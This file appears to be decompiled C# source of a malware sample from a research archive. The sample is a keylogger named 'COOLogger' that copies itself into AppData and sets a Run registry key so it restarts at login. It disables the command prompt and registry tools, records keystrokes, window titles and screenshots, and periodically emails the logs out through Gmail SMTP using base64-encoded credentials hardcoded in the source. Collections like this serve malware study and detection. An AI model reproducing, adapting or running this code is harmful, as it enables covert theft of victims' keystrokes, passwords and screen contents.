// Decompiled with JetBrains decompiler
// Type: woNcVFmpKmqFPkx
// Assembly: Rollin, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 50CF86F3-AA41-4028-9D25-BD33A1A49641
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00029-msil\Trojan-Ransom.Win32.Blocker.ikek-174c3d99c64c9c596b27b941164173450ec50b225bcda960b88ad355ebf45ad3.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class woNcVFmpKmqFPkx
{
  private static string kXyUTvdugkKkvpI = "bG9nc2Zvcml2YW5AZ21haWwuY29t";
  private static string FcxWOLWnCXLUsmQ = "dHJvamFuLjk1";
  private static string SyTYgWCLLKOlsze = "smtp.gmail.com";
  private static int qqHKNFdslVDGaDH = 587;
  private static string oNcVFmpKmqFPkxk;
  private static string XyUTvdugkKkvpIF;
  private static string cxWOLWnCXLUsmQS;
  private static string yTYgWCLLKOlszeq;
  private static string qHKNFdslVDGaDHV;
  private static string QGluusxjcjOaapt;
  private static int BMGYIeOZebmESab = 2400000;
  private static string UqDRyQCGgURLdbx = (string) null;
  private static object VSBOnnPXjMfLjBa = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string kJEgiPVowmSNOMR = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage CJQgIHXNPHgJnlU = new MailMessage();
  private static SmtpClient ZFokYtjaoyhhUHh = new SmtpClient();
  [AccessedThroughProperty("FokYtjaoyhhUHhE")]
  private static ERfNeQUtifZroLh _FokYtjaoyhhUHhE;
  private static object VhkzVWfpkOdwQje;
  private static RichTextBox iMqaWLfWNakTTHs;

  static woNcVFmpKmqFPkx()
  {
    woNcVFmpKmqFPkx.FokYtjaoyhhUHhE = new ERfNeQUtifZroLh();
    woNcVFmpKmqFPkx.VhkzVWfpkOdwQje = (object) Path.GetFileName(Application.ExecutablePath);
    woNcVFmpKmqFPkx.iMqaWLfWNakTTHs = new RichTextBox();
  }

  private static ERfNeQUtifZroLh FokYtjaoyhhUHhE
  {
    get => woNcVFmpKmqFPkx._FokYtjaoyhhUHhE;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (woNcVFmpKmqFPkx._FokYtjaoyhhUHhE != null)
        ERfNeQUtifZroLh.KeyDown -= new ERfNeQUtifZroLh.KeyDownEventHandler(woNcVFmpKmqFPkx.twoNcVFmpKmqFPk);
      woNcVFmpKmqFPkx._FokYtjaoyhhUHhE = value;
      if (woNcVFmpKmqFPkx._FokYtjaoyhhUHhE == null)
        return;
      ERfNeQUtifZroLh.KeyDown += new ERfNeQUtifZroLh.KeyDownEventHandler(woNcVFmpKmqFPkx.twoNcVFmpKmqFPk);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int zRdRPJbYuepvrDU(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    woNcVFmpKmqFPkx.QGluusxjcjOaapt = Conversions.ToString(true);
    woNcVFmpKmqFPkx.cxWOLWnCXLUsmQS = Conversions.ToString(true);
    woNcVFmpKmqFPkx.yTYgWCLLKOlszeq = Conversions.ToString(true);
    woNcVFmpKmqFPkx.qHKNFdslVDGaDHV = Conversions.ToString(false);
    woNcVFmpKmqFPkx.XyUTvdugkKkvpIF = Conversions.ToString(true);
    woNcVFmpKmqFPkx.oNcVFmpKmqFPkxk = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, (object) "\\JQgIHXNPHgJnlUI.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(woNcVFmpKmqFPkx.kJEgiPVowmSNOMR + "\\JQgIHXNPHgJnlUI.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, (object) "\\"), woNcVFmpKmqFPkx.VhkzVWfpkOdwQje))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, (object) "\\"), woNcVFmpKmqFPkx.VhkzVWfpkOdwQje)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, (object) "\\"), woNcVFmpKmqFPkx.VhkzVWfpkOdwQje)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, (object) "\\"), woNcVFmpKmqFPkx.VhkzVWfpkOdwQje)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, (object) "\\"), woNcVFmpKmqFPkx.VhkzVWfpkOdwQje)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(woNcVFmpKmqFPkx.oNcVFmpKmqFPkxk) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(woNcVFmpKmqFPkx.VhkzVWfpkOdwQje))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(woNcVFmpKmqFPkx.VhkzVWfpkOdwQje), Operators.ConcatenateObject(Operators.ConcatenateObject(woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, (object) "\\"), woNcVFmpKmqFPkx.VhkzVWfpkOdwQje));
    if (Conversions.ToBoolean(woNcVFmpKmqFPkx.XyUTvdugkKkvpIF))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, (object) "\\JQgIHXNPHgJnlUI.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(woNcVFmpKmqFPkx.cxWOLWnCXLUsmQS))
      Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(woNcVFmpKmqFPkx.yTYgWCLLKOlszeq))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(woNcVFmpKmqFPkx.qHKNFdslVDGaDHV))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 2400000;
    timer1.Tick += new EventHandler(woNcVFmpKmqFPkx.RfNeQUtifZroLhG_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(woNcVFmpKmqFPkx.MITXlHISbWzQiDW_Ticked);
    timer2.Start();
    woNcVFmpKmqFPkx.FokYtjaoyhhUHhE.GMITXlHISbWzQiD();
    Application.Run();
  }

  private static string VqrCZGjyfmFNDid()
  {
    string lpString = new string(char.MinValue, 100);
    woNcVFmpKmqFPkx.zRdRPJbYuepvrDU(woNcVFmpKmqFPkx.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string xkXyUTvdugkKkvp(string eqqHKNFdslVDGaD) => Encoding.ASCII.GetString(Convert.FromBase64String(eqqHKNFdslVDGaD));

  public static void RfNeQUtifZroLhG_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(woNcVFmpKmqFPkx.QGluusxjcjOaapt))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = woNcVFmpKmqFPkx.oICrXghfkVOVzNM(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(woNcVFmpKmqFPkx.VSBOnnPXjMfLjBa, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(woNcVFmpKmqFPkx.xkXyUTvdugkKkvp(woNcVFmpKmqFPkx.kXyUTvdugkKkvpI));
        message.To.Add(woNcVFmpKmqFPkx.xkXyUTvdugkKkvp(woNcVFmpKmqFPkx.kXyUTvdugkKkvpI));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = woNcVFmpKmqFPkx.iMqaWLfWNakTTHs.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(woNcVFmpKmqFPkx.xkXyUTvdugkKkvp(woNcVFmpKmqFPkx.kXyUTvdugkKkvpI), woNcVFmpKmqFPkx.xkXyUTvdugkKkvp(woNcVFmpKmqFPkx.FcxWOLWnCXLUsmQ))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        woNcVFmpKmqFPkx.iMqaWLfWNakTTHs.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage cjQgIhxnpHgJnlU = woNcVFmpKmqFPkx.CJQgIHXNPHgJnlU;
      cjQgIhxnpHgJnlU.From = new MailAddress(woNcVFmpKmqFPkx.xkXyUTvdugkKkvp(woNcVFmpKmqFPkx.kXyUTvdugkKkvpI));
      cjQgIhxnpHgJnlU.To.Add(woNcVFmpKmqFPkx.xkXyUTvdugkKkvp(woNcVFmpKmqFPkx.kXyUTvdugkKkvpI));
      cjQgIhxnpHgJnlU.Subject = "COOLogger Logs from - " + Environment.UserName;
      cjQgIhxnpHgJnlU.Body = woNcVFmpKmqFPkx.iMqaWLfWNakTTHs.Text;
      SmtpClient zfokYtjaoyhhUhh = woNcVFmpKmqFPkx.ZFokYtjaoyhhUHh;
      zfokYtjaoyhhUhh.Host = "smtp.gmail.com";
      zfokYtjaoyhhUhh.Port = 587;
      zfokYtjaoyhhUhh.EnableSsl = true;
      zfokYtjaoyhhUhh.Credentials = (ICredentialsByHost) new NetworkCredential(woNcVFmpKmqFPkx.xkXyUTvdugkKkvp(woNcVFmpKmqFPkx.kXyUTvdugkKkvpI), woNcVFmpKmqFPkx.xkXyUTvdugkKkvp(woNcVFmpKmqFPkx.FcxWOLWnCXLUsmQ));
      zfokYtjaoyhhUhh.Send(woNcVFmpKmqFPkx.CJQgIHXNPHgJnlU);
      woNcVFmpKmqFPkx.iMqaWLfWNakTTHs.Text = "";
    }
  }

  public static void twoNcVFmpKmqFPk(Keys e) => woNcVFmpKmqFPkx.iMqaWLfWNakTTHs.Text += woNcVFmpKmqFPkx.FokYtjaoyhhUHhE.WQGluusxjcjOaap(e);

  public static void MITXlHISbWzQiDW_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(woNcVFmpKmqFPkx.UqDRyQCGgURLdbx, woNcVFmpKmqFPkx.VqrCZGjyfmFNDid(), false) == 0)
      return;
    woNcVFmpKmqFPkx.UqDRyQCGgURLdbx = woNcVFmpKmqFPkx.VqrCZGjyfmFNDid();
    if (Operators.CompareString(woNcVFmpKmqFPkx.UqDRyQCGgURLdbx, "", false) == 0)
      return;
    RichTextBox iMqaWlfWnakTtHs = woNcVFmpKmqFPkx.iMqaWLfWNakTTHs;
    iMqaWlfWnakTtHs.Text = iMqaWlfWnakTtHs.Text + "\r\n\r\n~~~~~" + woNcVFmpKmqFPkx.UqDRyQCGgURLdbx + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string oICrXghfkVOVzNM(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
